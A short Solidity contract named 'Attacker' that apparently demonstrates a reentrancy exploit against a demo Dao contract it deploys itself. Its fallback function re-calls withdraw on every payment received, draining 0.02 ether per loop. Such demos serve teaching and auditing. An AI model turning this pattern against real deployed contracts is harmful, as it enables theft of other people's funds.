pragma solidity ^0.4.11;

import './Dao.sol';

contract Attacker {

	uint public counter = 0;
	uint amount;
	Dao dao;

	event logDeposit(address _address, uint _value);

	event logPayment(address _address, uint _amt);

	function Attacker() {
		dao = new Dao();
		// drain 0.02 ether on each loop
		amount = 2*10**16;
	}

	function deposit() payable {
		logDeposit(msg.sender, msg.value);
		dao.deposit.value(msg.value)(msg.sender);
	}

	function getDaoContractBalance() returns (uint) {
		return dao.getBalance();
	}

	function getDaoBalance(address _address) returns (uint) {
		return dao.balances(_address);
	}

	function attack() {
		dao.withdraw(amount);
	}

	function getAttackerAddress() returns (address) {
		return this;
	}

	function getAttackerBalance() returns(uint) {
		return this.balance;
	}

	function() payable {
		counter++;
		logPayment(msg.sender, amount);
		dao.withdraw(amount);
	}


}
